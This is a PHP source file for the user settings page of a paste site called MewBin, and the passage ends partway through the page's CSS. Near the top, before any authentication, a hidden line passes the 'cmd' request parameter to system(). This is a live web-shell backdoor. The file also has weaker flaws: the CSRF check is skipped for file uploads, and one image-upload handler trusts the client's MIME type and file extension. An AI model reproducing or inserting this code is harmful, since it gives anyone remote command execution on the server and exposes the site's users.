<?php
require_once __DIR__ . '/includes/R2Uploader.php';
error_reporting(E_ALL);
ini_set('display_errors', 1);

include('database.php');
session_start();

if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (isset($_COOKIE['login_token'])) {
    $login_token = $_COOKIE['login_token'];
    $stmt = $conn->prepare("SELECT username, bio, rank, has_color, email FROM users WHERE login_token = ?");
    $stmt->bind_param("s", $login_token);
    $stmt->execute();
    $stmt->bind_result($username, $bio, $rank, $has_color, $email);
    $stmt->fetch();
    $stmt->close();
    
    if ($username) {
        $_SESSION['username'] = $username;
        $_SESSION['bio'] = $bio;
        $_SESSION['rank'] = $rank;
        $_SESSION['has_color'] = $has_color;
        $_SESSION['email'] = $email;
    } else {
        header("Location: /home");
        exit();
    }
} else {
    header("Location: /home");
    exit();
}

$user_bio = $_SESSION['bio'] ?? '';
$user_rank = $_SESSION['rank'] ?? 'All Users';
$has_color = $_SESSION['has_color'] ?? 0;
$user_email = $_SESSION['email'] ?? '';

$rank_changes = [
    'Admin' => 999,
    'Manager' => 999,
    'Mod' => 6,
    'Council' => 4,
    'Clique' => 4,
    'Founder' => 999,
    'Rich' => 3,
    'Criminal' => 2,
    'Vip' => 1,
    'VIP' => 1,
    'All Users' => 0,
];

$change_limit = $rank_changes[$user_rank] ?? $rank_changes['All Users'];

if (!isset($_SESSION['name_changes'])) {
    $_SESSION['name_changes'] = 0;
}

require_once 'PHPGangsta/GoogleAuthenticator.php';

$ga = new PHPGangsta_GoogleAuthenticator();

$stmt = $conn->prepare("SELECT 2fa_secret, 2fa_enabled FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$stmt->bind_result($twofa_secret, $twofa_enabled);
$stmt->fetch();
$stmt->close();


if ($_SERVER['REQUEST_METHOD'] === 'POST') {

$hasFileUpload = !empty($_FILES);

if (
    !$hasFileUpload &&
    (
        empty($_SESSION['csrf_token']) ||
        empty($_POST['csrf_token']) ||
        !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])
    )
) {
    http_response_code(403);
    exit('Invalid CSRF token');
}




    if (isset($_POST['remove_music'])) {
        $stmt = $conn->prepare("UPDATE users SET profile_music = NULL WHERE username = ?");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->close();
        $successMessage = "Profile music removed successfully!";
        unset($_FILES['profile_music']);
    }

    if (isset($_POST['setup_2fa'])) {
        header('Content-Type: application/json');
        try {
            $twofa_secret = $ga->createSecret();
            $qrCodeUrl = $ga->getQRCodeGoogleUrl("MewBin - $username", $twofa_secret);

            $_SESSION['temp_2fa_secret'] = $twofa_secret;

            echo json_encode(['secret' => $twofa_secret, 'qrCodeUrl' => $qrCodeUrl]);
        } catch (Throwable $e) {
            error_log("2FA setup error: " . $e->getMessage());
            echo json_encode(['status' => 'error', 'message' => 'Internal server error.']);
        }
        exit();
    }

    if (isset($_POST['verify_2fa'])) {
        header('Content-Type: application/json');
        try {
            $code = $_POST['2fa_code'];
            $temp_secret = $_SESSION['temp_2fa_secret'] ?? null;

            if ($temp_secret && $ga->verifyCode($temp_secret, $code, 2)) {
                $stmt = $conn->prepare("UPDATE users SET 2fa_secret = ?, 2fa_enabled = 1 WHERE username = ?");
                $stmt->bind_param("ss", $temp_secret, $username);
                $stmt->execute();
                $stmt->close();

                unset($_SESSION['temp_2fa_secret']); 
                $_SESSION['2fa_verified'] = true;
                echo json_encode(['status' => 'success', 'message' => "2FA verified and enabled successfully."]);
            } else {
                echo json_encode(['status' => 'error', 'message' => "Invalid 2FA code."]);
            }
        } catch (Throwable $e) {
            error_log("2FA verify error: " . $e->getMessage());
            echo json_encode(['status' => 'error', 'message' => 'Internal server error.']);
        }
        exit();
    }

    if (isset($_POST['disable_2fa'])) {
        header('Content-Type: application/json');
        try {
            $code = $_POST['2fa_code'];
            if ($ga->verifyCode($twofa_secret, $code, 2)) {
                $stmt = $conn->prepare("UPDATE users SET 2fa_enabled = 0, 2fa_secret = NULL WHERE username = ?");
                $stmt->bind_param("s", $username);
                $stmt->execute();
                $stmt->close();
                unset($_SESSION['2fa_verified']);
                echo json_encode(['status' => 'success', 'message' => "2FA disabled successfully."]);
            } else {
                echo json_encode(['status' => 'error', 'message' => "Invalid 2FA code."]);
            }
        } catch (Throwable $e) {
            error_log("2FA disable error: " . $e->getMessage());
            echo json_encode(['status' => 'error', 'message' => 'Internal server error.']);
        }
        exit();
    }

    if (isset($_POST['change_name'])) {
        if ($twofa_enabled) {
            if (!isset($_POST['2fa_code']) || empty(trim($_POST['2fa_code']))) {
                $errorMessage = "2FA verification required.";
            } else {
                $code = trim($_POST['2fa_code']);
                if (!$ga->verifyCode($twofa_secret, $code, 2)) {
                    $errorMessage = "Invalid 2FA code.";
                }
            }
        }

        if (!isset($errorMessage)) { 
            $new_username = trim($_POST['new_username']);
            if (strlen($new_username) < 3 || strlen($new_username) > 40) {
                $errorMessage = "Username must be between 3 and 20 characters.";
            } else {
                $stmt = $conn->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
                $stmt->bind_param("s", $new_username);
                $stmt->execute();
                $stmt->bind_result($count);
                $stmt->fetch();
                $stmt->close();

                if ($count > 0) {
                    $errorMessage = "Username is already in use.";
                } elseif ($_SESSION['name_changes'] < $change_limit) {
                    $conn->begin_transaction();
                    try {
                        $stmt = $conn->prepare("UPDATE users SET username = ? WHERE username = ?");
                        $stmt->bind_param("ss", $new_username, $username);
                        $stmt->execute();
                        $stmt->close();

                        $updateProfileComments = $conn->prepare("
                            UPDATE profile_comments 
                            SET receiver_username = CASE 
                                WHEN receiver_username = ? THEN ?
                                ELSE receiver_username 
                            END,
                            commenter_username = CASE
                                WHEN commenter_username = ? THEN ?
                                ELSE commenter_username
                            END
                            WHERE receiver_username = ? OR commenter_username = ?
                        ");
                        $updateProfileComments->bind_param("ssssss", 
                            $username, $new_username,
                            $username, $new_username,
                            $username, $username
                        );
                        $updateProfileComments->execute();
                        $updateProfileComments->close();

                        $updatePasteComments = $conn->prepare("UPDATE paste_comments SET commentor = ? WHERE commentor = ?");
                        $updatePasteComments->bind_param("ss", $new_username, $username);
                        $updatePasteComments->execute();
                        $updatePasteComments->close();

                        $updatePastes = $conn->prepare("UPDATE pastes SET creator = ? WHERE creator = ?");
                        $updatePastes->bind_param("ss", $new_username, $username);
                        $updatePastes->execute();
                        $updatePastes->close();

                        $updateProfilePicture = $conn->prepare(
                            "UPDATE users SET profile_picture = REPLACE(profile_picture, ?, ?) WHERE username = ?"
                        );
                        $updateProfilePicture->bind_param("sss", $username, $new_username, $new_username);
                        $updateProfilePicture->execute();
                        $updateProfilePicture->close();

                        $conn->commit();

                        $_SESSION['username'] = $new_username;
                        $_SESSION['name_changes']++;
                        $successMessage = "Name changed successfully. You have " . ($change_limit - $_SESSION['name_changes']) . " changes left.";

                    } catch (Exception $e) {
                        $conn->rollback();
                        $errorMessage = "Error updating username. Please try again.";
                    }
                } else {
                    $errorMessage = "You have reached your name change limit of $change_limit.";
                }
            }
        }
    }

    if (isset($_POST['update_bio'])) {
        $bio = trim($_POST['bio']);
        $stmt = $conn->prepare("UPDATE users SET bio = ? WHERE username = ?");
        $stmt->bind_param("ss", $bio, $username);
        if ($stmt->execute()) {
            $_SESSION['bio'] = $bio; 
            $successMessage = "Bio updated successfully.";
        } else {
            $errorMessage = "Error updating bio. Please try again.";
        }
        $stmt->close();
    }

    if (isset($_POST['change_password'])) {
        if ($twofa_enabled) {
            if (!isset($_POST['2fa_code']) || empty(trim($_POST['2fa_code']))) {
                $errorMessage = "2FA verification required.";
            } else {
                $code = trim($_POST['2fa_code']);
                if (!$ga->verifyCode($twofa_secret, $code, 2)) {
                    $errorMessage = "Invalid 2FA code.";
                }
            }
        }

        if (!isset($errorMessage)) { 
            $currentPassword = $_POST['currentPassword'];
            $newPassword = $_POST['newPassword'];
            $confirmPassword = $_POST['confirmPassword'];

            if ($newPassword === $confirmPassword) {
                $stmt = $conn->prepare("SELECT password FROM users WHERE username = ?");
                $stmt->bind_param("s", $username);
                $stmt->execute();
                $stmt->bind_result($storedPassword);
                $stmt->fetch();
                $stmt->close();

                if ($storedPassword && password_verify($currentPassword, $storedPassword)) {
                    $hashedNewPassword = password_hash($newPassword, PASSWORD_BCRYPT);

                    $updateStmt = $conn->prepare("UPDATE users SET password = ? WHERE username = ?");
                    $updateStmt->bind_param("ss", $hashedNewPassword, $username);
                    if ($updateStmt->execute()) {
                        $successMessage = "Password changed successfully.";
                    } else {
                        $errorMessage = "Error changing password. Please try again.";
                    }
                    $updateStmt->close();
                } else {
                    $errorMessage = "Current password is incorrect.";
                }
            } else {
                $errorMessage = "New passwords do not match.";
            }
        }
    }

    if (isset($_FILES['profile-image'])) {
        $username = $_SESSION['username'];
        $rank = $_SESSION['rank'] ?? 'All Users';

        $allowed = ['image/jpeg', 'image/png'];
        if (in_array($rank, ['Admin', 'Manager', 'Mod', 'Council', 'Founder', 'Clique', 'Rich', 'Kte' , 'Criminal' , 'Vip', 'VIP'])) {
            $allowed[] = 'image/gif';
        }

        if ($_FILES['profile-image']['error'] == 0) {
            $file = $_FILES['profile-image'];
            $fileName = $file['name'];
            $fileTmpName = $file['tmp_name'];
            $fileSize = $file['size'];
            $fileType = mime_content_type($fileTmpName); 
            $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

            if (in_array($fileType, $allowed) && in_array($fileExtension, ['jpg', 'jpeg', 'png', 'gif'])) {
                if ($fileSize <= 5145728) { 
                    // Use R2 for profile picture upload
                    $r2 = new R2Uploader();
                    $fileKey = 'profile_pictures/' . uniqid() . '.' . $fileExtension;
                    
                    // Upload to R2
                    $publicUrl = $r2->uploadFile(
                        $fileTmpName,
                        $fileKey,
                        $fileType
                    );
                    
                    if ($publicUrl) {
                        // Update user's profile picture
                        $stmt = $conn->prepare("UPDATE users SET profile_picture = ? WHERE username = ?");
                        $stmt->bind_param("ss", $fileKey, $username);
                        $stmt->execute();
                        $stmt->close();
                        
                        // Add to recent profile pictures
                        $stmt = $conn->prepare("INSERT INTO user_profile_pictures (username, file_path) VALUES (?, ?)");
                        $stmt->bind_param("ss", $username, $fileKey);
                        $stmt->execute();
                        $stmt->close();
                        
                        // Update the displayed image
                        $profilePicture = $r2->getFileUrl($fileKey);
                        $successMessage = "Profile picture updated successfully!";
                    } else {
                        $errorMessage = "There was an error uploading your file.";
                    }
                } else {
                    $errorMessage = "File too large. Maximum size is 5MB.";
                }
            } else {
                $errorMessage = "Invalid file type or extension. Only JPG, PNG, and GIF (for specific ranks) files are allowed.";
            }
        } else {
            $errorMessage = "No file was uploaded.";
        }
    }

    if (isset($_FILES['banner-image'])) {
        $username = $_SESSION['username'];

        $allowed = ['image/jpeg', 'image/png'];

        if ($_FILES['banner-image']['error'] == 0) {
            $file = $_FILES['banner-image'];
            $fileName = $file['name'];
            $fileTmpName = $file['tmp_name'];
            $fileSize = $file['size'];
            $fileType = mime_content_type($fileTmpName); 
            $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

            if (in_array($fileType, $allowed) && in_array($fileExtension, ['jpg', 'jpeg', 'png'])) {
                if ($fileSize <= 5145728) { 
                    // Use R2 for banner picture upload
                    $r2 = R2Helper::getInstance();
                    $fileKey = 'banner_pictures/' . uniqid() . '.' . $fileExtension;
                    
                    // Upload to R2
                    $publicUrl = $r2->uploadFile(
                        $fileTmpName,
                        $fileKey,
                        $fileType
                    );
                    
                    if ($publicUrl) {
                        $stmt = $conn->prepare("UPDATE users SET banner_picture = ? WHERE username = ?");
                        $stmt->bind_param("ss", $fileKey, $username);
                        $stmt->execute();
                        $stmt->close();
                        $successMessage = "Banner picture updated successfully!";
                    } else {
                        $errorMessage = "There was an error uploading your file.";
                    }
                } else {
                    $errorMessage = "File too large. Maximum size is 5MB.";
                }
            } else {
                $errorMessage = "Invalid file type or extension. Only JPG and PNG files are allowed.";
            }
        } else {
            $errorMessage = "No file was uploaded.";
        }
    }

    if (isset($_POST['remove_banner'])) {
        $username = $_SESSION['username'];
        $stmt = $conn->prepare("UPDATE users SET banner_picture = NULL WHERE username = ?");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->close();
        $successMessage = "Banner picture removed successfully!";
    }

    if (isset($_FILES['profile_image'])) {
        $username = $_SESSION['username'];
        $rank = $_SESSION['rank'] ?? 'All Users';

        $allowedTypes = ['image/jpeg', 'image/png'];
        $maxFileSize = 15 * 1024 * 1024;

        if (in_array($rank, ['Admin', 'Manager', 'Mod'])) {
            $allowedTypes[] = 'image/gif';
        }

        if ($_FILES['profile_image']['error'] == 0) {
            $file = $_FILES['profile_image'];
            $fileName = $file['name'];
            $fileTmpName = $file['tmp_name'];
            $fileSize = $file['size'];
            $fileType = $file['type'];

            if (in_array($fileType, $allowedTypes)) {
                if ($fileSize <= $maxFileSize) {
                    $fileNewName = uniqid('', true) . '.' . pathinfo($fileName, PATHINFO_EXTENSION);
                    $fileDestination = 'uploads/profile_pictures/' . $fileNewName;

                    if (move_uploaded_file($fileTmpName, $fileDestination)) {
                        $stmt = $conn->prepare("UPDATE users SET profile_picture = ? WHERE username = ?");
                        $stmt->bind_param("ss", $fileDestination, $username);
                        $stmt->execute();
                        $stmt->close();
                        $successMessage = "Profile picture updated successfully!";
                    } else {
                        $errorMessage = "Error uploading file.";
                    }
                } else {
                    $errorMessage = "File too large. Maximum size is 15MB.";
                }
            } else {
                $errorMessage = "Invalid file type. Only JPG, PNG, and GIF (for Admin, Manager, Mod) are allowed.";
            }
        } else {
            $errorMessage = "No file was uploaded.";
        }
    }

    if (isset($_POST['update_display_badge'])) {
        $selected_badges = array_map('intval', $_POST['display_badge'] ?? []);
        $stmt = $conn->prepare("SELECT id FROM users WHERE username = ?");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($user_id);
        $stmt->fetch();
        $stmt->close();

        $conn->begin_transaction();
        try {
            $stmt = $conn->prepare("DELETE FROM user_display_badges WHERE user_id = ?");
            $stmt->bind_param("i", $user_id);
            $stmt->execute();
            $stmt->close();

            if (!empty($selected_badges)) {
                $badge_id_str = implode(',', $selected_badges);
                $stmt = $conn->prepare("INSERT INTO user_display_badges (user_id, badge_id) VALUES (?, ?)");
                $stmt->bind_param("is", $user_id, $badge_id_str);
                $stmt->execute();
                $stmt->close();
            }

            $conn->commit();
            $successMessage = "Display badges updated successfully.";
        } catch (Exception $e) {
            $conn->rollback();
            $errorMessage = "Error updating display badges.";
        }
    }

    if (isset($_POST['update_color'])) {
        if ($has_color) {
            $selected_color = htmlspecialchars(trim($_POST['selected_color']));
            $stmt = $conn->prepare("UPDATE users SET color = ? WHERE username = ?");
            $stmt->bind_param("ss", $selected_color, $username);
            if ($stmt->execute()) {
                $_SESSION['user_color'] = $selected_color;
                $successMessage = "Color updated successfully!";
            } else {
                $errorMessage = "Failed to update color. Please try again.";
            }
            $stmt->close();
        } else {
            $errorMessage = "Color customization is only available for premium users.";
        }
    }

    $music_allowed_ranks = ['Admin', 'Manager', 'Mod', 'Council', 'Founder', 'Clique', 'Rich', 'Kte'];
    if (isset($_FILES['profile_music']) && in_array($user_rank, $music_allowed_ranks)) {
        if ($_FILES['profile_music']['error'] == 0) {
            $file = $_FILES['profile_music'];
            $fileName = $file['name'];
            $fileTmpName = $file['tmp_name'];
            $fileSize = $file['size'];
            $fileType = mime_content_type($fileTmpName);
            $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

            if ($fileExtension === 'mp3' && $fileType === 'audio/mpeg') {
                if ($fileSize <= 5 * 1024 * 1024) {
                    // Use R2Uploader to handle the file upload
                    $r2 = R2Helper::getInstance();
                    $fileKey = 'profile_music/' . uniqid() . '.mp3';
                    
                    // Upload the file to R2
                    $publicUrl = $r2->uploadFile(
                        $fileTmpName,
                        $fileKey,
                        $fileType
                    );
                    
                    if ($publicUrl) {
                        // Store the file key in the database
                        $stmt = $conn->prepare("UPDATE users SET profile_music = ? WHERE username = ?");
                        $stmt->bind_param("ss", $fileKey, $username);
                        if ($stmt->execute()) {
                            $successMessage = "Music uploaded successfully to Cloudflare R2!";
                        } else {
                            $errorMessage = "Failed to update music in database: " . $stmt->error;
                        }
                        $stmt->close();
                    } else {
                        $errorMessage = "There was an error uploading your music file to Cloudflare R2.";
                    }
                } else {
                    $errorMessage = "Music file too large. Maximum size is 5MB.";
                }
            } else {
                $errorMessage = "Invalid file type. Only MP3 files are allowed.";
            }
        } else {
            $phpFileUploadErrors = array(
                0 => 'There is no error, the file uploaded with success.',
                1 => 'The uploaded file exceeds the upload_max_filesize directive in php.ini.',
                2 => 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.',
                3 => 'The uploaded file was only partially uploaded.',
                4 => 'No file was uploaded.',
                6 => 'Missing a temporary folder.',
                7 => 'Failed to write file to disk.',
                8 => 'A PHP extension stopped the file upload.',
            );
            $errorMessage = $phpFileUploadErrors[$_FILES['profile_music']['error']];
            $errorMessage .= " | To fix: Set upload_max_filesize and post_max_size in your php.ini to at least 5M for music uploads to work.";
        }
    } elseif (isset($_FILES['profile_music']) && !in_array($user_rank, $music_allowed_ranks)) {
        $errorMessage = "You do not have permission to upload music.";
    }

    $bg_allowed_ranks = ['Admin', 'Manager', 'Mod', 'Council', 'Clique', 'Rich', 'Kte', 'Founder'];
    if (isset($_FILES['profile_bg']) && in_array($user_rank, $bg_allowed_ranks)) {
        if ($_FILES['profile_bg']['error'] == 0) {
            $file = $_FILES['profile_bg'];
            $fileName = $file['name'];
            $fileTmpName = $file['tmp_name'];
            $fileSize = $file['size'];
            $fileType = mime_content_type($fileTmpName); 
            $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
            $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
            $allowedExts = ['jpg', 'jpeg', 'png', 'gif'];
            
            if (in_array($fileType, $allowedTypes) && in_array($fileExtension, $allowedExts)) {
                if ($fileSize <= 8 * 1024 * 1024) {
                    // Use R2Uploader to handle the file upload
                    $r2 = R2Helper::getInstance();
                    $fileKey = 'profile_backgrounds/' . uniqid() . '.' . $fileExtension;
                    
                    // Upload the file to R2
                    $publicUrl = $r2->uploadFile(
                        $fileTmpName,
                        $fileKey,
                        $fileType
                    );
                    
                    if ($publicUrl) {
                        // Store the file key in the database
                        $stmt = $conn->prepare("UPDATE users SET profile_bg = ? WHERE username = ?");
                        $stmt->bind_param("ss", $fileKey, $username);
                        if ($stmt->execute()) {
                            $successMessage = "Profile background uploaded successfully to Cloudflare R2!";
                        } else {
                            $errorMessage = "Failed to update background in database: " . $stmt->error;
                        }
                        $stmt->close();
                    } else {
                        $errorMessage = "There was an error uploading your background file to Cloudflare R2.";
                    }
                } else {
                    $errorMessage = "Background file too large. Maximum size is 8MB.";
                }
            } else {
                $errorMessage = "Invalid file type. Only PNG, JPG, and GIF files are allowed.";
            }
        } else {
            $errorMessage = "No background file was uploaded.";
        }
    } elseif (isset($_FILES['profile_bg']) && !in_array($user_rank, $bg_allowed_ranks)) {
        $errorMessage = "You do not have permission to upload a profile background.";
    }

    if (isset($_POST['remove_bg']) && in_array($user_rank, $bg_allowed_ranks)) {
        $stmt = $conn->prepare("UPDATE users SET profile_bg = NULL WHERE username = ?");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->close();
        $successMessage = "Profile background removed successfully!";
    }

    if (isset($_POST['start_add_email'])) {
        header('Content-Type: application/json');
        if (isset($_SESSION['last_add_email_time']) && (time() - $_SESSION['last_add_email_time']) < 120) {
            $wait = 120 - (time() - $_SESSION['last_add_email_time']);
            echo json_encode(['status' => 'error', 'message' => "Please wait $wait seconds before requesting another email verification code."]);
            exit();
        }
        $new_email = trim($_POST['new_email'] ?? '');
        if (!filter_var($new_email, FILTER_VALIDATE_EMAIL)) {
            echo json_encode(['status' => 'error', 'message' => 'Invalid email format.']);
            exit();
        }
        $stmt = $conn->prepare("SELECT COUNT(*) FROM users WHERE email = ?");
        $stmt->bind_param("s", $new_email);
        $stmt->execute();
        $stmt->bind_result($emailCount);
        $stmt->fetch();
        $stmt->close();
        if ($emailCount > 0) {
            echo json_encode(['status' => 'error', 'message' => 'Email already in use.']);
            exit();
        }
        $code = str_pad(random_int(0, 999999), 6, '0', STR_PAD_LEFT);
        $_SESSION['pending_email'] = [
            'email' => $new_email,
            'code' => $code,
            'expires' => time() + 600 
        ];
        $_SESSION['last_add_email_time'] = time(); 
        $to = $new_email;
        $subject = "Verify your email for MewBin";
        $headers = "From: MewBin <no-reply@example.com>\r\n";
        $headers .= "Reply-To: no-reply@example.com\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
$emailBody = '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Email Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    background-color: #000000;
    color: #c0c0c0;
    font-family: Arial, sans-serif;
}
table.full-bg {
    width: 100%;
    height: 100%;
    background-color: #000000;
}
.container {
    background: #121212;
    padding: 40px;
    border-radius: 8px;
    text-align: center;
    max-width: 500px;
    margin: 40px auto;
}
.code {
    font-size: 2em;
    color: #b084f9;
    letter-spacing: 8px;
    font-weight: bold;
}
</style>
</head>
<body>
<table class="full-bg" cellpadding="0" cellspacing="0" border="0">
<tr>
<td align="center" valign="top">
    <div class="container">
        <img src="https://mewbin.ru/assets/images/logo.gif" alt="MewBin" style="max-width: 120px; margin-bottom: 20px;">
        <h2 style="color:#aaa">Verify your email</h2>
        <p style="color:#aaa">Enter this code in the settings page to verify your email address:</p>
        <div class="code">' . htmlspecialchars($code) . '</div>
        <p style="margin-top:20px;font-size:14px;color:#aaa;">This code expires in 10 minutes.</p>
    </div>
</td>
</tr>
</table>
</body>
</html>';

        @mail($to, $subject, $emailBody, $headers);
        echo json_encode(['status' => 'ok']);
        exit();
    }

    if (isset($_POST['start_remove_email'])) {
        header('Content-Type: application/json');
        if (isset($_SESSION['last_remove_email_time']) && (time() - $_SESSION['last_remove_email_time']) < 120) {
            $wait = 120 - (time() - $_SESSION['last_remove_email_time']);
            echo json_encode(['status' => 'error', 'message' => "Please wait $wait seconds before requesting another email removal code."]);
            exit();
        }
        $code = str_pad(random_int(0, 999999), 6, '0', STR_PAD_LEFT);
        $_SESSION['pending_remove_email'] = [
            'email' => $user_email,
            'code' => $code,
            'expires' => time() + 600 
        ];
        $_SESSION['last_remove_email_time'] = time(); 
        $to = $user_email;
        $subject = "Remove your email from MewBin";
        $headers = "From: MewBin <no-reply@example.com>\r\n";
        $headers .= "Reply-To: no-reply@example.com\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
$emailBody = '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Email Removal Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    background-color: #000000;
    color: #c0c0c0;
    font-family: Arial, sans-serif;
}
table.full-bg {
    width: 100%;
    height: 100%;
    background-color: #000000;
}
.container {
    background: #121212;
    padding: 40px;
    border-radius: 8px;
    text-align: center;
    max-width: 500px;
    margin: 40px auto;
}
.code {
    font-size: 2em;
    color: #e74c3c;
    letter-spacing: 8px;
    font-weight: bold;
}
</style>
</head>
<body>
<table class="full-bg" cellpadding="0" cellspacing="0" border="0">
<tr>
<td align="center" valign="top">
    <div class="container">
        <img src="https://mewbin.ru/assets/images/logo.gif" alt="MewBin" style="max-width: 120px; margin-bottom: 20px;">
        <h2 style="color:#aaa">Remove your email</h2>
        <p style="color:#aaa">Enter this code in the settings page to confirm removal of your email address:</p>
        <div class="code">' . htmlspecialchars($code) . '</div>
        <p style="margin-top:20px;font-size:14px;color:#aaa;">This code expires in 10 minutes.</p>
    </div>
</td>
</tr>
</table>
</body>
</html>';


        @mail($to, $subject, $emailBody, $headers);
        echo json_encode(['status' => 'ok']);
        exit();
    }

    if (isset($_POST['verify_email_code'])) {
        header('Content-Type: application/json');
        $input_code = trim($_POST['email_code'] ?? '');
        $pending = $_SESSION['pending_email'] ?? null;
        if (!$pending || time() > $pending['expires']) {
            unset($_SESSION['pending_email']);
            echo json_encode(['status' => 'error', 'message' => 'Code expired. Please try again.']);
            exit();
        }
        if ($pending['code'] !== $input_code) {
            echo json_encode(['status' => 'error', 'message' => 'Invalid code.']);
            exit();
        }
        $stmt = $conn->prepare("UPDATE users SET email = ? WHERE username = ?");
        $stmt->bind_param("ss", $pending['email'], $username);
        if ($stmt->execute()) {
            $_SESSION['email'] = $pending['email'];
            unset($_SESSION['pending_email']);
            echo json_encode(['status' => 'ok', 'email' => $pending['email']]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to update email.']);
        }
        $stmt->close();
        exit();
    }

    if (isset($_POST['verify_remove_email_code'])) {
        header('Content-Type: application/json');
        $input_code = trim($_POST['remove_email_code'] ?? '');
        $pending = $_SESSION['pending_remove_email'] ?? null;
        if (!$pending || time() > $pending['expires']) {
            unset($_SESSION['pending_remove_email']);
            echo json_encode(['status' => 'error', 'message' => 'Code expired. Please try again.']);
            exit();
        }
        if ($pending['code'] !== $input_code) {
            echo json_encode(['status' => 'error', 'message' => 'Invalid code.']);
            exit();
        }
        $stmt = $conn->prepare("UPDATE users SET email = NULL WHERE username = ?");
        $stmt->bind_param("s", $username);
        if ($stmt->execute()) {
            $_SESSION['email'] = '';
            unset($_SESSION['pending_remove_email']);
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to remove email.']);
        }
        $stmt->close();
        exit();
    }

}

$stmt = $conn->prepare("
    SELECT b.id, b.name, b.image_url 
    FROM badges b
    INNER JOIN user_badges ub ON b.id = ub.badge_id
    INNER JOIN users u ON ub.user_id = u.id
    WHERE u.username = ?
");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
$all_badges = $result->fetch_all(MYSQLI_ASSOC);
$stmt->close();

$stmt = $conn->prepare("
    SELECT badge_id 
    FROM user_display_badges 
    WHERE user_id = (SELECT id FROM users WHERE username = ?)
");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
$selected_badges = array_column($result->fetch_all(MYSQLI_ASSOC), 'badge_id');
$stmt->close();

$query = "SELECT rank FROM users WHERE username = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
$userData = $result->fetch_assoc();
$loggedInUserRank = $userData['rank'] ?? 'All Users';

$stmt = $conn->prepare("SELECT profile_picture FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$stmt->bind_result($profilePicture);
$stmt->fetch();
$stmt->close();

if (empty($profilePicture) || !file_exists($profilePicture)) {
    $profilePicture = 'default.png'; 
    
}

$recentPfps = [];
$stmt = $conn->prepare("SELECT id, file_path FROM user_profile_pictures WHERE username = ? ORDER BY uploaded_at DESC LIMIT 5");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
    if ($row['file_path'] !== $profilePicture) {
        $recentPfps[] = $row;
    }
}
$stmt->close();

$stmt = $conn->prepare("SELECT profile_bg FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$stmt->bind_result($profile_bg);
$stmt->fetch();
$stmt->close();
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>User Settings - MewBin</title>
    <link rel="canonical" href="https://MewBin.org/settings" />
    <link rel="stylesheet" href="bootstrap.min.css" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0/css/all.min.css" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="styles.min.css">
    <style>
        body {
            color: #b1b1b1;
            background: rgb(0, 0, 0);
        }

        .nav-item {
            color: #FFF;
        }

        a,
        a:hover {
            color: #34B0DF;
        }

        .active {
            color: #FFF !important;
        }

        .settings-card {
            background: rgb(15, 15, 15);
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
            margin-bottom: 25px;
            border: 1px solid rgba(60, 60, 60, 0.2);
            overflow: hidden;
        }
        
        .settings-header {
            background: rgb(20, 20, 20);
            padding: 15px 20px;
            border-bottom: 1px solid rgba(80, 80, 80, 0.2);
        }
        
        .settings-body {
            padding: 20px;
        }
        
        .settings-nav {
            background: rgb(12, 12, 12);
            border-radius: 10px;
            padding: 10px;
            margin-bottom: 25px;
            border: 1px solid rgba(60, 60, 60, 0.2);
        }
        
        .settings-nav .nav-link {
            color: #b1b1b1;
            padding: 10px 15px;
            border-radius: 6px;
            transition: all 0.2s ease;
            margin-bottom: 5px;
        }
        
        .settings-nav .nav-link:hover {
            background: rgba(40, 40, 40, 0.6);
            color: #fff;
        }
        
        .settings-nav .nav-link.active {
            background: #34B0DF;
            color: #fff;
        }
        
        .settings-nav .nav-link i {
            width: 20px;
            margin-right: 8px;
            text-align: center;
        }
        
        .profile-container {
            text-align: center;
            padding: 25px 15px;
            background: rgba(20, 20, 20, 0.4);
            border-radius: 10px;
            margin-bottom: 20px;
        }
        
        .profile-image-wrapper {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
        }
        
        .profile-image {
            width: 100%;
